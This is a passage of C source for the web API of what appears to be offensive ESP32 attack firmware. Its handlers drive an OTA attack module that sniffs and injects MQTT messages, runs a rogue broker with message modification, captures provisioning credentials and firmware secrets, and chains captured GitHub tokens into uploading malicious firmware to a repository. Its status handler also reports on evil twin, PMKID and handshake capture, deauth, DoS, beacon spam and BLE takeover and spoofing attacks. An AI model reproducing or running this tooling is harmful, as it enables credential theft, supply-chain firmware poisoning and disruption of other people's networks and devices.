    cfg.fw_extract_strings    = cJSON_IsBool(fw_strings_json) ? fw_strings_json->valueint : true;

    ESP_LOGI(TAG, "Starting OTA attack: mode=%d ssid=%s broker=%s:%u",
             cfg.mode, cfg.wifi_ssid, cfg.mqtt_broker, cfg.mqtt_port);

    ota_attack_start_config(&cfg);

    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ota_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping OTA attack");
    ota_attack_stop();
    return send_success_response(req);
}

static esp_err_t ota_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = ota_attack_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddStringToObject(fallback, "state", "idle");
        cJSON_AddStringToObject(fallback, "mode", "SNIFF");
        cJSON_AddNumberToObject(fallback, "mqtt_msg_count", 0);
        cJSON_AddNumberToObject(fallback, "url_count", 0);
        cJSON_AddNumberToObject(fallback, "github_url_count", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t ota_messages_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_attack_get_captured_messages_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_urls_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_attack_get_urls_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_github_urls_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_attack_get_github_urls_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_inject_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[768];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *topic_json   = cJSON_GetObjectItem(root, "topic");
    cJSON *payload_json = cJSON_GetObjectItem(root, "payload");
    if (!cJSON_IsString(topic_json) || !cJSON_IsString(payload_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing topic or payload");
        return ESP_FAIL;
    }

    bool ok = ota_attack_inject_message(topic_json->valuestring, payload_json->valuestring);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_download_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[128];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *index_json = cJSON_GetObjectItem(root, "url_index");
    int url_index = cJSON_IsNumber(index_json) ? index_json->valueint : 0;
    cJSON_Delete(root);

    bool ok = ota_attack_download_firmware(url_index);
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "started", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_download_result_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_attack_get_download_result_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "{\"success\":false}");
    return ESP_OK;
}

static esp_err_t ota_dns_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_attack_get_dns_entries_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

static esp_err_t ota_http_entries_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    const char *json = ota_attack_get_http_entries_json();
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json ? json : "[]");
    return ESP_OK;
}

/* ── GitHub Repo Operations ──────────────────────────────────── */

static esp_err_t ota_github_parse_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *url_json = cJSON_GetObjectItem(root, "url");
    if (!cJSON_IsString(url_json) || url_json->valuestring == NULL) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing url");
        return ESP_FAIL;
    }

    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));
    bool ok = ota_attack_parse_github_url(url_json->valuestring, &repo);

    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    if (ok) {
        cJSON_AddStringToObject(resp, "owner", repo.owner);
        cJSON_AddStringToObject(resp, "repo", repo.repo);
        cJSON_AddStringToObject(resp, "path", repo.path);
        cJSON_AddStringToObject(resp, "branch", repo.branch);
        if (repo.token[0]) cJSON_AddStringToObject(resp, "token", repo.token);
        cJSON_AddBoolToObject(resp, "token_valid", repo.token_valid);
        cJSON_AddBoolToObject(resp, "parsed", repo.parsed);
    }
    return send_json_response(req, resp);
}

static esp_err_t ota_github_access_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[768];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));

    cJSON *owner_json  = cJSON_GetObjectItem(root, "owner");
    cJSON *repo_json   = cJSON_GetObjectItem(root, "repo");
    cJSON *token_json  = cJSON_GetObjectItem(root, "token");
    cJSON *branch_json = cJSON_GetObjectItem(root, "branch");

    if (cJSON_IsString(owner_json))  strncpy(repo.owner, owner_json->valuestring, sizeof(repo.owner) - 1);
    if (cJSON_IsString(repo_json))   strncpy(repo.repo, repo_json->valuestring, sizeof(repo.repo) - 1);
    if (cJSON_IsString(token_json))  strncpy(repo.token, token_json->valuestring, sizeof(repo.token) - 1);
    if (cJSON_IsString(branch_json)) strncpy(repo.branch, branch_json->valuestring, sizeof(repo.branch) - 1);

    bool ok = ota_attack_github_access_repo(&repo);

    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    cJSON_AddBoolToObject(resp, "token_valid", repo.token_valid);
    if (repo.token[0]) cJSON_AddStringToObject(resp, "token", repo.token);
    return send_json_response(req, resp);
}

static esp_err_t ota_github_list_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    /* Read path from query string: ?path=firmware/ */
    char path_buf[128] = {0};
    if (httpd_req_get_url_query_str(req, path_buf, sizeof(path_buf)) == ESP_OK) {
        char decoded[128] = {0};
        if (get_form_value(path_buf, "path", decoded, sizeof(decoded))) {
            /* decoded now has the path value */
        }
    }

    /* Use the current GitHub repo context from ota_attack module */
    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));

    /* Try to get repo info from the OTA attack module's current state */
    const char *repo_json_str = ota_attack_get_github_repo_json();
    if (repo_json_str && strlen(repo_json_str) > 2) {
        cJSON *repo_obj = cJSON_Parse(repo_json_str);
        if (repo_obj) {
            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
            cJSON *b = cJSON_GetObjectItem(repo_obj, "branch");
            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
            if (cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
            cJSON_Delete(repo_obj);
        }
    }

    const char *list_path = path_buf[0] ? path_buf : "";
    const char *result = ota_attack_github_list_files(&repo, list_path);

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, result ? result : "{\"files\":[],\"error\":\"no repo context\"}");
    return ESP_OK;
}

static esp_err_t ota_github_file_sha_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[256];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;

    cJSON *file_path_json = cJSON_GetObjectItem(root, "file_path");
    if (!cJSON_IsString(file_path_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing file_path");
        return ESP_FAIL;
    }

    /* Get current repo context */
    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));
    const char *repo_json_str = ota_attack_get_github_repo_json();
    if (repo_json_str && strlen(repo_json_str) > 2) {
        cJSON *repo_obj = cJSON_Parse(repo_json_str);
        if (repo_obj) {
            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
            cJSON_Delete(repo_obj);
        }
    }

    bool ok = ota_attack_github_get_file_sha(&repo, file_path_json->valuestring);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    if (ok && repo.file_sha[0]) {
        cJSON_AddStringToObject(resp, "sha", repo.file_sha);
    }
    return send_json_response(req, resp);
}

static esp_err_t ota_github_upload_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;

    cJSON *fw_path_json   = cJSON_GetObjectItem(root, "firmware_path");
    cJSON *commit_msg_json = cJSON_GetObjectItem(root, "commit_msg");
    cJSON *fw_data_json   = cJSON_GetObjectItem(root, "firmware_hex");
    cJSON *fw_size_json   = cJSON_GetObjectItem(root, "firmware_size");

    /* Get repo context */
    ota_github_repo_t repo;
    memset(&repo, 0, sizeof(repo));
    const char *repo_json_str = ota_attack_get_github_repo_json();
    if (repo_json_str && strlen(repo_json_str) > 2) {
        cJSON *repo_obj = cJSON_Parse(repo_json_str);
        if (repo_obj) {
            cJSON *o = cJSON_GetObjectItem(repo_obj, "owner");
            cJSON *r = cJSON_GetObjectItem(repo_obj, "repo");
            cJSON *t = cJSON_GetObjectItem(repo_obj, "token");
            cJSON *b = cJSON_GetObjectItem(repo_obj, "branch");
            cJSON *s = cJSON_GetObjectItem(repo_obj, "file_sha");
            if (cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
            if (cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
            if (cJSON_IsString(t)) strncpy(repo.token, t->valuestring, sizeof(repo.token) - 1);
            if (cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
            if (cJSON_IsString(s)) strncpy(repo.file_sha, s->valuestring, sizeof(repo.file_sha) - 1);
            cJSON_Delete(repo_obj);
        }
    }

    const char *target_path = cJSON_IsString(fw_path_json) ? fw_path_json->valuestring : "firmware.bin";
    const char *commit_msg  = cJSON_IsString(commit_msg_json) ? commit_msg_json->valuestring : "Update firmware";

    /* Parse hex firmware data if provided, otherwise use downloaded firmware from OTA module */
    bool ok = false;
    if (cJSON_IsString(fw_data_json) && cJSON_IsNumber(fw_size_json)) {
        const char *hex = fw_data_json->valuestring;
        size_t hex_len = strlen(hex);
        uint32_t fw_size = (uint32_t)fw_size_json->valueint;

        if (hex_len > 0 && fw_size > 0 && hex_len / 2 <= OTA_MAX_FIRMWARE_SIZE) {
            uint8_t *fw_data = malloc(fw_size);
            if (fw_data) {
                for (uint32_t i = 0; i < fw_size && i * 2 + 1 < hex_len; i++) {
                    unsigned int byte;
                    if (sscanf(hex + i * 2, "%02x", &byte) == 1) {
                        fw_data[i] = (uint8_t)byte;
                    }
                }
                ok = ota_attack_github_upload_firmware(&repo, fw_data, fw_size, target_path, commit_msg);
                free(fw_data);
            }
        }
    }

    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_github_repo_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_github_repo_json());
    return ESP_OK;
}

static esp_err_t ota_github_result_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_github_result_json());
    return ESP_OK;
}

/* ── Provision Sniffer Handlers ─────────────────────────────────── */

static esp_err_t ota_prov_creds_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_prov_creds_json());
    return ESP_OK;
}

static esp_err_t ota_prov_summary_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_prov_summary_json());
    return ESP_OK;
}

static esp_err_t ota_prov_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ota_attack_clear_prov_creds();
    return send_success_response(req);
}

/* ── Rogue Broker Handlers ──────────────────────────────────────── */

static esp_err_t ota_mitm_messages_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_mitm_messages_json());
    return ESP_OK;
}

static esp_err_t ota_rogue_broker_summary_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_rogue_broker_summary_json());
    return ESP_OK;
}

static esp_err_t ota_mitm_modify_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[768];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *topic_json   = cJSON_GetObjectItem(root, "topic");
    cJSON *payload_json = cJSON_GetObjectItem(root, "payload");
    if (!cJSON_IsString(topic_json) || !cJSON_IsString(payload_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing topic or payload");
        return ESP_FAIL;
    }

    bool ok = ota_attack_set_mitm_modify_rule(topic_json->valuestring, payload_json->valuestring);
    cJSON_Delete(root);

    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", ok);
    return send_json_response(req, resp);
}

static esp_err_t ota_mitm_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ota_attack_clear_mitm_messages();
    return send_success_response(req);
}

/* ── Firmware Analysis Handlers ─────────────────────────────────── */

static esp_err_t ota_fw_analyze_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    int found = ota_attack_analyze_firmware();
    cJSON *resp = cJSON_CreateObject();
    cJSON_AddBoolToObject(resp, "success", found > 0);
    cJSON_AddNumberToObject(resp, "secrets_found", found);
    return send_json_response(req, resp);
}

static esp_err_t ota_fw_secrets_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_fw_secrets_json());
    return ESP_OK;
}

static esp_err_t ota_fw_summary_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, ota_attack_get_fw_analysis_summary_json());
    return ESP_OK;
}

static esp_err_t ota_fw_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ota_attack_clear_fw_secrets();
    return send_success_response(req);
}

static esp_err_t ota_chain_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[1024];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *ssid_json     = cJSON_GetObjectItem(root, "wifi_ssid");
    cJSON *pass_json     = cJSON_GetObjectItem(root, "wifi_password");
    cJSON *broker_json   = cJSON_GetObjectItem(root, "mqtt_broker");
    cJSON *port_json     = cJSON_GetObjectItem(root, "mqtt_port");
    cJSON *wait_json     = cJSON_GetObjectItem(root, "wait_for_device_sec");
    cJSON *fw_path_json  = cJSON_GetObjectItem(root, "gh_firmware_path");
    cJSON *gh_branch_json = cJSON_GetObjectItem(root, "gh_branch");
    cJSON *gh_commit_json = cJSON_GetObjectItem(root, "gh_commit_msg");
    cJSON *gh_idx_json   = cJSON_GetObjectItem(root, "gh_captured_url_index");

    const char *ssid   = cJSON_IsString(ssid_json) ? ssid_json->valuestring : "";
    const char *pass   = cJSON_IsString(pass_json) ? pass_json->valuestring : "";
    const char *broker = cJSON_IsString(broker_json) ? broker_json->valuestring : "";
    uint16_t port      = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
    uint32_t wait_sec  = cJSON_IsNumber(wait_json) ? (uint32_t)wait_json->valueint : 300;

    /* Start GITHUB_TAKEOVER mode via the full config API */
    ota_attack_config_t cfg = {
        .mode               = OTA_MODE_GITHUB_TAKEOVER,
        .mqtt_port          = port,
        .subscribe_topic    = "#",
        .inject_count       = 1,
        .inject_interval_ms = 0,
        .verify_ssl         = false,
        .timeout_sec        = wait_sec,
        .gh_captured_url_index = -1,
        .malicious_firmware = NULL,
        .malicious_firmware_size = 0,
    };
    strncpy(cfg.wifi_ssid, ssid, sizeof(cfg.wifi_ssid) - 1);
    strncpy(cfg.wifi_password, pass, sizeof(cfg.wifi_password) - 1);
    strncpy(cfg.mqtt_broker, broker, sizeof(cfg.mqtt_broker) - 1);
    strncpy(cfg.mqtt_client_id, "omega_ota_gh", sizeof(cfg.mqtt_client_id) - 1);

    if (cJSON_IsString(fw_path_json))
        strncpy(cfg.gh_firmware_path, fw_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
    else
        strncpy(cfg.gh_firmware_path, "firmware.bin", sizeof(cfg.gh_firmware_path) - 1);

    if (cJSON_IsString(gh_branch_json))
        strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
    else
        strncpy(cfg.gh_branch, "main", sizeof(cfg.gh_branch) - 1);

    if (cJSON_IsString(gh_commit_json))
        strncpy(cfg.gh_commit_msg, gh_commit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
    else
        strncpy(cfg.gh_commit_msg, "Update firmware", sizeof(cfg.gh_commit_msg) - 1);

    if (cJSON_IsNumber(gh_idx_json))
        cfg.gh_captured_url_index = gh_idx_json->valueint;

    ESP_LOGI(TAG, "Starting OTA full chain: ssid=%s broker=%s port=%u", ssid, broker, port);

    ota_attack_init();
    ota_attack_start_config(&cfg);

    cJSON_Delete(root);
    return send_success_response(req);
}

/* ================================================================== */
/*  STATUS / STOP HANDLERS                                             */
/* ================================================================== */

static esp_err_t stop_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_timer_active = false;
    stop_deauth_attack();
    attack_bt_spam_stop();
    return send_success_response(req);
}

static esp_err_t status_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    cJSON *response = cJSON_CreateObject();
    if (response == NULL) {
        return send_json_response(req, response);
    }
    cJSON_AddBoolToObject(response, "attacking", is_attack_active());
    cJSON_AddBoolToObject(response, "ble_running", attack_bt_spam_is_running());
    cJSON_AddBoolToObject(response, "ble_deauth_running", ble_deauth_is_running());
    cJSON_AddBoolToObject(response, "ble_connect_running", ble_connect_flood_is_running());
    cJSON_AddBoolToObject(response, "ble_l2cap_running", ble_l2cap_flood_is_running());
    cJSON_AddBoolToObject(response, "ble_spoof_running", ble_spoof_is_running());
    cJSON_AddBoolToObject(response, "ble_passkey_running", ble_passkey_is_running());
    cJSON_AddBoolToObject(response, "ble_takeover_running", ble_takeover_is_running());
    cJSON_AddBoolToObject(response, "ota_running", ota_attack_is_running());
    cJSON_AddBoolToObject(response, "eviltwin_running", attack_eviltwin_is_running());
    cJSON_AddBoolToObject(response, "probe_running", attack_probe_is_running());
    cJSON_AddBoolToObject(response, "pmkid_running", attack_pmkid_is_running());
    cJSON_AddBoolToObject(response, "handshake_running", attack_handshake_is_running());
    cJSON_AddBoolToObject(response, "dos_running", attack_dos_is_running());
    cJSON_AddBoolToObject(response, "beacon_running", attack_beacon_spam_is_running());
    cJSON_AddBoolToObject(response, "deauth_detect_running", deauth_detector_is_running());
    if (attack_dos_is_running()) {
        cJSON_AddStringToObject(response, "dos", "DoS attack active");
        cJSON_AddStringToObject(response, "dos_method", attack_dos_get_method_str());
        cJSON_AddNumberToObject(response, "dos_packets", attack_dos_get_packet_count());
    }
    if (attack_beacon_spam_is_running()) {
        cJSON_AddStringToObject(response, "beacon", "Beacon spam active");
        cJSON_AddStringToObject(response, "beacon_mode", attack_beacon_spam_get_mode_str());
        cJSON_AddNumberToObject(response, "beacon_aps", attack_beacon_spam_get_ap_count());
        cJSON_AddNumberToObject(response, "beacon_packets", attack_beacon_spam_get_packet_count());
    }
    if (attack_bt_spam_is_running()) {
        cJSON_AddStringToObject(response, "bluetooth", "BLE spam active");
    }
    if (ble_deauth_is_running()) {
        cJSON_AddStringToObject(response, "ble_deauth", "BLE deauth active");
    }
    if (ble_spoof_is_running()) {
        const char *mode_str = (ble_spoof_get_mode() == BLE_SPOOF_MODE_CLONE) 
                                ? "BLE clone active" : "BLE spoof active";
        cJSON_AddStringToObject(response, "ble_spoof", mode_str);
    }
    if (ble_passkey_is_running()) {
        cJSON_AddStringToObject(response, "ble_passkey", "BLE passkey capture active");
    }
    if (ble_takeover_is_running()) {
        cJSON_AddStringToObject(response, "ble_takeover", "BLE device takeover active");
    }
    if (ota_attack_is_running()) {
        cJSON_AddStringToObject(response, "ota", "OTA attack active");
        cJSON_AddStringToObject(response, "ota_state", ota_attack_get_state_str());
        cJSON_AddNumberToObject(response, "ota_mqtt_msgs", ota_attack_get_mqtt_msg_count());
        cJSON_AddNumberToObject(response, "ota_urls", ota_attack_get_url_count());
        cJSON_AddNumberToObject(response, "ota_github_urls", ota_attack_get_github_url_count());
        cJSON_AddNumberToObject(response, "ota_elapsed", ota_attack_get_elapsed_sec());
        cJSON_AddNumberToObject(response, "ota_remaining", ota_attack_get_remaining_sec());
    }
    if (attack_pmkid_is_running()) {
        cJSON_AddStringToObject(response, "pmkid", "PMKID capture active");
    }
    if (attack_handshake_is_running()) {
        cJSON_AddStringToObject(response, "handshake", "Handshake capture active");
    }
    if (attack_eviltwin_is_running()) {
        eviltwin_status_t et_st;
        attack_eviltwin_get_status(&et_st);
        cJSON_AddStringToObject(response, "eviltwin", "Evil Twin active");
        cJSON_AddNumberToObject(response, "eviltwin_captured", et_st.captured_count);
        cJSON_AddNumberToObject(response, "eviltwin_clients", et_st.clients_connected);
    }
    if (deauth_detector_is_running()) {
        cJSON_AddStringToObject(response, "deauth_detect", "Deauth detector active");
        cJSON_AddNumberToObject(response, "deauth_detect_tracked", deauth_detector_get_tracked_count());
        cJSON_AddNumberToObject(response, "deauth_detect_alerts", deauth_detector_get_alert_count());
        cJSON_AddNumberToObject(response, "deauth_detect_total", deauth_detector_get_total_deauths());
    }
    if (is_attack_active()) {
        char target[18];
        get_attack_target(target);
        cJSON_AddStringToObject(response, "target", target);
        if (attack_timer_active) {
            int elapsed = time(NULL) - attack_start_time;
            int remaining = (attack_duration_minutes * 60) - elapsed;
            if (remaining > 0) cJSON_AddNumberToObject(response, "remaining", remaining);
        }
    }
    return send_json_response(req, response);
}

static esp_err_t detector_api_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    /* Use the full status JSON from attack_deauth_detector */
    cJSON *status = deauth_detector_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "tracked_count", 0);
        cJSON_AddNumberToObject(fallback, "alert_count", 0);
        cJSON_AddNumberToObject(fallback, "total_deauths", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t deauth_detect_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

